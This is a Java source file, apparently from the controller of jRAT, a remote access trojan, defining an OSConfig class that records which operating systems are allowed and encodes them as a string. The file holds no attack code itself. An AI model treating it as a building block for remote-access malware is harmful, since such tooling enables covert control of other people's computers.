package jrat.controller;

import oslib.OperatingSystem;

import java.util.ArrayList;
import java.util.List;


public final class OSConfig {

	private final List<OperatingSystem> osList = new ArrayList<OperatingSystem>();

	public boolean isAllowed(OperatingSystem os) {
		return this.osList.indexOf(os) >= 0;
	}

	public void addOS(OperatingSystem os) {
		this.osList.add(os);
	}

	public int size() {
		return this.osList.size();
	}

	public static final String generateString(OSConfig c) {
		String str = "";

		if (c.isAllowed(OperatingSystem.WINDOWS)) {
			str += "win ";
		}
		if (c.isAllowed(OperatingSystem.MACOS)) {
			str += "mac ";
		}
		if (c.isAllowed(OperatingSystem.LINUX)) {
			str += "linux ";
		}
		if (c.isAllowed(OperatingSystem.BSD)) {
			str += "bsd ";
		}
		if (c.isAllowed(OperatingSystem.SOLARIS)) {
			str += "solaris ";
		}
		
		return str.trim();
	}

}
